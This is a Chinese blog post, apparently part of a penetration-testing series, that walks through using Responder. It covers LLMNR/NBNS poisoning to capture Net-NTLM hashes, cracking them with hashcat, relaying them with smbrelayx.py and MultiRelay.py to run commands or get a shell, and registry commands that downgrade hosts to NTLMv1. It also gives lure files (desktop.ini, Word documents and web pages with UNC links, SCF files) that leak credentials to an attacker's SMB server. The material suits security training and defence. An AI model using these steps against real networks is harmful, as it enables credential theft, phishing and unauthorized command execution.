> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg2MzkwNDU1Mw==&mid=2247485829&idx=1&sn=a2b21fc320ff1ca4217adaf81d4b1fe8

#  内网渗透：详解Responder利用方式  
原创 信安路漫漫  信安路漫漫   2025-07-14 23:00  
  
## 前言  
  
前面已经出了三篇关于内网渗透方面的文章，今天就接着来看看在内网中经常会使用的一个工具Responder。在这篇文章中你可以学到Responder的原理，作用以及其综合利用。这也是内网渗透的第四篇文章，前三篇如下，大家有兴趣可以前去看看。  
  
[内网渗透：Kerberos认证协议安全性分析](https://mp.weixin.qq.com/s?__biz=Mzg2MzkwNDU1Mw==&mid=2247485756&idx=1&sn=d1a76d2a708847a878dbadd37c4f9324&scene=21#wechat_redirect)  
  
  
[内网横移：抓取域管理员密码](https://mp.weixin.qq.com/s?__biz=Mzg2MzkwNDU1Mw==&mid=2247485746&idx=1&sn=522a763ed7979d15632d3847faa72a46&scene=21#wechat_redirect)  
  
  
[内网渗透：详解kerberoast攻击](https://mp.weixin.qq.com/s?__biz=Mzg2MzkwNDU1Mw==&mid=2247485789&idx=1&sn=742cdfbd430eddc15172da04bb10365b&scene=21#wechat_redirect)  
  
## Responder简介  
  
Responder在内网渗透中会经常看到它的身影，是常用的一个工具。**Responder通过协议欺骗和模拟服务这两个功能来获取到目标的Net-NTLM hash，进而可能得到系统的控制权限。**  
## Responder原理  
  
客户端/目标**无法通过DNS域名解析**  
，则会回退到LLMNR（在Windows Vista中引入）和NBT-NS进行解析。如果我们的Responder在运行着，那么我们将**对所有我们能看到的LLMNR和NBT-NS请求响应“yeah, 就是我”，然后所有的传输都将被引导到我们这。**  
  
如下图所以，在DNS解析失败以后，会使用其它的协议进行解析主机名或域名：  
  
![1689085719_64ad6717142d4d761b5f6.png!small?1689085718809](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQRibKkP9Ig7jtIy8TUScKCH4aDNFzibd02DB9HHvPrwahqtFwOUbiacQrQ/640?wx_fmt=jpeg&from=appmsg "")  
  
上面就是Responder进行协议欺骗的原理。**Responder主要就是两个作用，就是协议欺骗和模拟服务。**  
  
协议欺骗：通过回到协议的广播包，进行欺骗，进而冒充别的主机，将流量转到欺骗主机。利用的协议有下面的三种LLMNR、NBNS、MDNS。  
  
模拟服务：Responder会模拟出一些常见的服务，与其交互，获取到秘钥等信息  
  
  
**首先要明白Responder工具使用的也是欺骗的一种，跟传统的arp欺骗在原理上也是相同的，就是收到广播包时进行回复，这样就会将请求转移到我们设置的主机上。**  
  
同时，这种方式与arp欺骗也有所不同，是由于它使用的协议是LLMNR、NBNS、MDNS。这三种协议与DNS协议类似，都是根据主机名或者域名来解析为IP地址，但是**这三种协议是在DNS无法解析以后才会生效**  
。那么，这就产生了一个问题，那就是如何让DNS不生效，进而使用这种协议，达到欺骗的效果。  
  
可以使用下面的方式  
  
**1）访问不存在的服务，如SMB，http等**  
  
net use \\winsssss\  
  
**2）ping一个不存在的域名或者主机名**  
  
上面只是说了最简单的两种，当然还有其它的方式。  
### 知识点  

```
win域内进行解析主机名或者域名的顺序1.查看本地hosts文件 2.查找DNS缓存，windows可使用命令 ipconfig/displaydns 查看 3.DNS服务器 4.尝试LLMNR、NBNS和MDNS协议进行解析
```

### 三种协议的介绍  
  
**LLMNR**  
  
链路本地多播名称解析（LLMNR）是一个基于域名系统（DNS）数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。**Windows 操作系统从 Windows Vista开始就内嵌支持，Linux系统也通过systemd实现了此协议。它通过UDP 5355端口进行通信，且LLMNR支持IPV6。**  
  
**NBNS**  
  
网络基本输入/输出系统(NetBIOS) 名称服务器(NBNS) 协议是 TCP/IP 上的 NetBIOS (NetBT) 协议族的一部分，它在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。通过UDP 137端口进行通信，但NBNS不支持IPV6。  
  
**mdns（局域网中的DNS）**  
  
mdns 即多播dns（Multicast DNS），mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信，遵从dns协议，使用现有的DNS信息结构、名语法和资源记录类型。并且没有指定新的操作代码或响应代码。  
  
在计算机网络中 ， 多播DNS （ mDNS ）协议将主机名解析为不包含本地名称服务器的小型网络中的IP地址。 它是一种零配置服务，使用与单播域名系统 （DNS）基本相同的编程接口，数据包格式和操作语义。 虽然Stuart Cheshire将mDNS设计为独立协议，但它可以与标准DNS服务器协同工作。它通过UDP 5353端口进行通信，且MDNS也支持IPV6。  
## Responder的作用  
  
了解了Responder的工作原理，那么该工具最终可以帮助我们拿到什么？  
  
我们的目标当然是获取机器的登录凭证。我们知道在内网中认证时不会发送用户名和明文密码的，是通过发送Net-NTLM hash来进行认证的。**那么Responder的目的就是获取到用户的Net-NTLM hash(Net-NTLM Hash用于网络身份认证（例如NTLM认证）)。**  
  
Net-NTLM hash目前存在两个版本，分别是**Net-NTLMv1和Net-NTLM v2。**  
  
NTLM v2相对于NTLMV1更加的安全，无法通过NTLM v2还原出用户的ntlm hash，而NTLMv1由于其脆弱性，在控制Challenge后可以在短时间内通过彩虹表还原出用户的ntlm hash。由于这种原因，NTLM v2不能直接应用于Pass The Hash攻击，只能通过暴力破解来获取明文密码。而攻击者获取NTLMv1 hash后，可以直接还原出NTLM HASH，这样的话就可以将NTLM HASH直接用于Pass The Hash攻击，相较于NTLM v2还需要破解才能利用更加不安全。  
  
**NTLMV1可以通过下面的工具或者网站进行破解**  
  
NTLMv1还原工具： https://github.com/eladshamir/Internal-Monologue  
  
访问网站https://crack.sh/get-cracking/，使用免费的彩虹表进行破解  
  
windows基于NTLM认证的有SMB、HTTP、LDAP、MSSQL等，因此用户在访问这些服务时会进行NTLM认证，如果访问我们的服务，则我们可以拿到Net-NTML hash。  
  
如下图是SMB协议认证的过程中的数据包，可以看到发送了NTLMv2  
  
![1689085893_64ad67c54cd3374805d8b.png!small?1689085893201](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQzXHzwf2dYDtPXvCztUQ6pEdgvkThbeoUzGhub0l9eJ9vT1v9nXhia8w/640?wx_fmt=jpeg&from=appmsg "")  
  
## 拿到NET-NTLM hash以后我们又可以做什么呢？  
  
当我们拿到**Net-NTLM Hash，**  
主要有下面的两种利用方式  
  
1.使用Hashcat**破解Net-NTLM Hash**  
。如果是v1的话，拿到Net-NTLM就相当于拿NTLM HASH.但是在实际中遇到的例子往往不会是v1，而是v2，这个时候密码强度高一点，基本就跑不出来了  
  
2.Relay Net-NTLM Hash（也就是**中继攻击**  
）  

```
注意点：
1、自Windows Vista/Server2008开始起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限。
2、修改注册表需要管理员权限
修改注册表开启Net-NTLMv1：
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f
为确保Net-NTLMv1开启成功，还需要修改两处注册表键值：
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f


Net-NTLMv1的格式为：username::hostname:LM response:NTLM response:challenge
如下，是一个 Net-NTLMv1的例子
Administrator::adexx-PC:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad:1122334455667788




Net-NTLMv2的格式：username::domain:challenge:HMAC-MD5:blob
```

  
  
## Responder攻击方式  
  
上面已经介绍了Responder的攻击原理，下面就来实战一下。这个的前提是我们已经拿到了一台内网的机器。  
### 破解Net-NTLM Hash  
  
**启动Resonder**  
  
kail linux中默认安装了Responder，所以在kail中执行下面的命令  

```
responder -I eth0
```

  
PS：-I:指定监听的网卡  
  
可以看到下面的界面，Responder已经模拟出了各种服务  
  
![1689086088_64ad68888fa6732482c58.png!small?1689086088360](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQ8sZyfA5eqqrwjuyOOxVEMNqibVEibo9KDVIgibr8KB7KqibYM2NgzNxj7A/640?wx_fmt=jpeg&from=appmsg "")  
  
如果我们访问Responder模拟出来的服务，那么就可以记录下来用户的凭证。这里有一个问题，就是如何让用户访问这个服务？这个问题会放到最后，现在只要知道如何是通过欺骗还是其它的方式，目的就是让目标机器访问到我们模拟的服务。  
  
当我们访问http服务时，会跳出这个登录框，填写用户名为a，密码123456  
  
![1689086106_64ad689a4acb9941946ab.png!small?1689086106060](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQJZKw8b2934gibWbibBN2JiclczrrYK1ibKicWUjlswGUEz3kuw7ETgJUCQA/640?wx_fmt=jpeg&from=appmsg "")  
  
![1689086125_64ad68adb98ae1680b316.png!small?1689086125749](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQgUK1BKTqiaMmMvCDUg4pzDQAncr6ESfHibLrXer4icxnGPAhYFP6SqthA/640?wx_fmt=jpeg&from=appmsg "")  
  
访问SMB协议，在另外一个主机上访问一个不存在的共享文件，可以看到收到了Responder收到了hash。  
  
![1689086209_64ad690162187ab000554.png!small?1689086209229](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQyycJRyl2UEOibWVsrADe3ic0oEyVvT9TALtX80ROFzDxzLJ6K0y9cHZw/640?wx_fmt=jpeg&from=appmsg "")  
  
**破解密码**  
  
获取hash值之后，我们尝试使用hashcat对这段hash进行暴力破解，hashcat是一个破解密码的神器，可支持调用CPU、GPU，且GPU的破解速度是CPU完全比不了的，破解密文类型多，支持各种加密算法  
  
hashcat破解模式：5600  
  
mode；5600指的就是NetNTLMv2 hash  
  
**hashcat -m 5600 ./xxxx.txt ./mima.txt**  
  
可以看到成功破解出了密码  
  
![1689086245_64ad6925c03ff6b70c6c4.png!small?1689086245440](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQ7ZdykPd8eKWqUjkv4v8dkicaExCOAAYOPt93VeSEAktehicIpwIZH6Yw/640?wx_fmt=jpeg&from=appmsg "")  
### NET-NTLM HASH中继攻击（中间人攻击）  
  
NTLM中继攻击已经被发现十多年了，要实现NTLM中继攻击，也需要先进行LLMNR/NBNS欺骗，这样，攻击机器就可以充当了中间人，本质上还是由于NTLM认证机制所导致的，且对于最新的NTLMv2认证任然有效。  
  
但这个过程却是存在下面的限制：  
  
工作组环境下：两台机器的密码需要一致才能成功  
  
域环境下：**被欺骗用户（发起请求的用户）需要域管理员组里边的用户才可以**  
，NTLM中继成功后的权限为被欺骗用户的权限。  
  
这个攻击最常用的服务就是SMB。而中继到smb服务要求**被攻击机器不能开启SMB签名**  
，普通域内机器默认不是开启的，但是域控是默认开启的。  
  
可以用Responder下的RunFinger.py脚本来检测是否开启smb签名：  
  
**python3 /usr/share/responder/tools/RunFinger.py -i 192.168.111.0/24**  

```
SMB签名可以在注册表中修改：
Microsoft 网络客户端：对通信进行数字签名 (始终)
注册表项： HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManWorkstation\Parameters
注册表值 ：RequireSecuritySignature
数据类型：REG_DWORD
数据：0 (禁用) ，1 (启用)


Microsoft 网络服务器：对通信进行数字签名 (始终)
注册表项： HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
注册表值 ：RequireSecuritySignature
数据类型：REG_DWORD
数据：0 (禁用) ，1 (启用)
```

  
**中继攻击常用的脚本**  
  
kail中/usr/share/doc/python3-impacket/examples/下面的两个文件  
  
ntlmrelayx.py：可以中继到smb服务  
  
smbrelayx.py：smb中继，可以执行命令  
  
**python3 smbrelayx.py -h 192.168.56.105 -c whoami**  
  
还可以使用responder下面的脚本，该脚本可以直接拿到shell。在kali中，这个脚本在/usr/share/doc/python3-impacket/examples/文件夹下  
  
该脚本功能强大，通过ALL参数可以获得一个稳定的shell，还有抓密码等其他功能。运行的命令如下：  
  
**python3 MultiRelay.py -hpython3 MultiRelay.py -t 192.168.111.131 -u ALL**  
  
接下来来实际验证一下  
  
本次实验我们采用smbrelayx.py脚本来进行验证，该脚本可以执行命令  
  
攻击机：192.168.56.102  
  
被攻击机：192.168.56.105  
  
被控主机：192.168.56.104  
  
首先在kail linux中执行下面的命令：  
  
python3 smbrelayx.py -h 192.168.56.105 -c whoami  
  
-c后面接要执行的命令  
  
![1689135534_64ae29ae57c6aeea954a2.png!small?1689135534898](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQRB911ib5TdXm2xLmTzjia7CibiaGpkguQvgDianuGxMA3muyUackSZiaLGxQ/640?wx_fmt=jpeg&from=appmsg "")  
  
现在 SMB 已经由 smbrelayx.py 脚本来进行中继，我们需要修改一下responder的配置文件 Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off：  
  
![1689135539_64ae29b36ea8ae5de2d34.png!small?1689135540095](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQJYexD03icWPrcN4cJGRdFsfbTZ7RwaDmo58QtqC08OpPFnPyic6UOFoA/640?wx_fmt=jpeg&from=appmsg "")  
  
重启 Responder.py，准备毒化（这里responder的作用就是当访问一个不存在的共享路径，将名称解析降到LLMNR/NBNS时，来抓取网络中所有的LLMNR和NetBIOS请求并进行响应）  
  
![1689086713_64ad6af9171efc7ce8a86.png!small?1689086712876](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQ4D97Y7FQ3tdf7RZPVvzGHYZSUuicVU9FsGGm9aZtfBwN7KYyW0k5Pqg/640?wx_fmt=jpeg&from=appmsg "")  
  
结果如下，可以看到成功执行了命令  
  
![1689135556_64ae29c44082bc9b2d68a.png!small?1689135557047](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQ3ctB37bh3PjXYVJ3dn5QvwiaGibh8j1R9VBpT92zpeLETnBJceafSCQw/640?wx_fmt=jpeg&from=appmsg "")  
  
至此，已经完成了中继攻击。  
  
## Respoder与钓鱼相结合  
  
在上面的流程中我们看到了，要获取到用户的NET-NTLM hash需要访问Responder模拟的服务，或者通过欺骗的方式来引导用户访问这些服务（如访问不存在的域名）。这就导致了一个问题，如何才能让被攻击者如访问这些服务？  
  
我们可以与钓鱼相配合，可以通过下面的方式制作我们钓鱼文件，通过邮件或者发送共享目录中，诱导被攻击者点击。  
### desktop.ini制作文件  
  
在企业内部的常用共享上新建一个目录，当用户点到这个目录的时候会自动请求攻击的SMB。  
  
如下图，在一个共享目录中新建一个password文件夹，右键点击属性，修改自定义  
  
![1689086774_64ad6b36591907ed6df9b.png!small?1689086774124](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQSE3BoicNuB7mia5wWusRmNrbgMxlavA7rC0V1enpSDhK3HvcdWTuVXyQ/640?wx_fmt=jpeg&from=appmsg "")  
  
在查看中把这个选项取消  
  
![1689135724_64ae2a6c4e1d7db8cc435.png!small?1689135725032](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQY89Lfib7I4pjtwqJI6bMv0wGhIwILIklic2ZXDCmjyMgPMHpPERvFJXQ/640?wx_fmt=jpeg&from=appmsg "")  
  
进入到password文件夹下修改这个文件的值为一个不存在的smb或Responder模拟的服务地址。  
  
![1689086791_64ad6b47eda75d6c4dcf8.png!small](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQ0R5GyMpibCLuKmb53iaqqVZbxw3KnH7V7vmxfYb5mVl3cdPibvia9VcEjA/640?wx_fmt=jpeg&from=appmsg "")  
  
只要打开这个test文件夹，就会访问我们设置的SMB服务，同样，我们也可以拿到NTLM hash了。  
### doc文件中使用UNC路径  
  
在doc里插入图片然后将相应的链接改为UNC路径，通过内网邮件发送给对方。  
  
新建一个word，然后插入一张图片  
  
![1689135739_64ae2a7b15267104177ac.png!small?1689135739891](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQQZxRu012byGT6SqVQ5cXPibaiagLNbmkVow3DfLylZIA5oOjNSgRPWBw/640?wx_fmt=jpeg&from=appmsg "")  
  
用压缩软件打开，进入word/_rels，打开document.xml.rels，可以看到Target参数本来是本地的路径  
  
![1689135853_64ae2aed2a36848b42e31.png!small?1689135853755](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQcVkp3w2VqPOBdItuUEk7TViayBPH0icIc4moCWFIeW8OEqicXSrUDEr1g/640?wx_fmt=jpeg&from=appmsg "")  
  
![1689135861_64ae2af52d71ce1e207f5.png!small?1689135861777](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQlukHKVbVsprFECIhodsKA0knj5iaKhFUY5Qb7FDWk14takGDTCiaa46Q/640?wx_fmt=jpeg&from=appmsg "")  
  
我们修改为UNC路径，然后加上TargetMode=”External”  
  
![1689135867_64ae2afb09ad683f61a0f.png!small?1689135867561](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Rzo6rPw2nBy0ric0GSpFuwRB9L433AROQh4j2tBFB4U5fCN6ltpvHmnGLxZ9z6pdtlXaC2Depl56IIpQwJvYYmg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
最后保存，打开这个文件就可以拿到net-ntlm hash。  
### 利用PDF的GoTObe和GoToR功能  
  
让对方打开PDF文件时自动请求SMB服务器上的文件，通过邮件发送给相关的人员。  
### web页面嵌入网络共享资源  
  
在web页面中嵌入网络共享资源，然后引诱用户去访问，也可以通过outlook发送给相关的人员  

```
<p>test</p> <img src=&#34;\\\\192.168.56.105\\test&#34;>
```

### 可以创建scf文件  
  
只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的，所以当打开文件夹的时候，目标主机就会去请求指定UNC的图标资源。于是我们像上面那样修改UNC路径，指向我们的服务器。然后用responder监听  

```
[Shell] Command=2 IconFile=\192.168.56.105\scf\scf.ico [Taskbar] Command=ToggleDesktop
```

  
## 总结  
  
关于内网安全的文章以及出了好几篇，大家可能有个疑问，那就是很多的攻击都需要再去破解，如果都使用了强密码，那么是不是攻击就没有了效果。其实安全就是这样，我们就是要从任何可能造成安全问题的地方去尝试，找到短板，这就要求我们尽可能的尝试多种方法。  
  
**由于本人水平有限，文章中可能会出现一些错误，欢迎各位大佬指正，感激不尽。如果有什么好的想法也欢迎交流~~**  
## 参考文章  
  
https://www.freebuf.com/articles/network/256844.html  
  
https://blog.csdn.net/nzjdsds/article/details/94314995  
  
https://www.cnblogs.com/0d4y/p/12805112.html  
  
  
